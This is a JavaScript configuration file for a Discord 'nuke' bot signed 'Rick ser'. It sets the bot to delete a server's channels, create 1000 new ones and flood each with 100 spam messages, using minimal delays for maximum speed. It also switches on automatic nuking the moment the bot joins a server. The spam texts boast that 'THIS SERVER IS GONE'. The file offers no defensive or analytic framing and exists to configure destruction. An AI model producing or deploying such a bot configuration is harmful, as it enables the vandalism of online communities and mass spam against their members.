// config.js - ULTRA FAST CONFIGURATION
require('dotenv').config();

module.exports = {
    // Bot Settings
    token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
    prefix: '!',
    
    // MASSIVE NUKE Settings
    channelName: 'IMPOSTER-network',
    spamMessage: 'Nuke by Rick ser',
    channelsToCreate: 1000,           // Create 1000 channels
    messagesPerChannel: 100,           // 100 messages per channel = 100,000 total messages
    
    // SPEED Settings (milliseconds) - MINIMAL DELAYS FOR MAXIMUM SPEED
    delays: {
        delete: 50,       // 50ms between deletions (FAST)
        create: 20,       // 20ms between creations (ULTRA FAST)
        spam: 10,         // 10ms between messages (MAXIMUM SPEED)
        embed: 50         // 50ms after embed
    },
    
    // Auto Nuke Settings
    autoNukeOnJoin: true,
    
    // Server Settings
    port: process.env.PORT || 3000,
    
    // Bot Status Messages
    statusMessages: [
        '💀 1000 CHANNELS',
        '🔥 MASSIVE NUKE',
        '⚡ BY RICK SER',
        '💀 100k MESSAGES'
    ],
    
    // Spam Messages Array
    spamMessages: [
        '💀 **Nuke by Rick ser** 💀',
        '🔥 **IMPOSTER NETWORK** 🔥',
        '⚡ **1000 CHANNELS CREATED** ⚡',
        '💀 **THIS SERVER IS GONE** 💀',
        '🔥 **BY RICK SER** 🔥',
        '⚡ **MASSIVE DESTRUCTION** ⚡',
        '💀 **RICK SER OWNS HERE** 💀',
        '🔥 **100K MESSAGES SENT** 🔥'
    ]
};
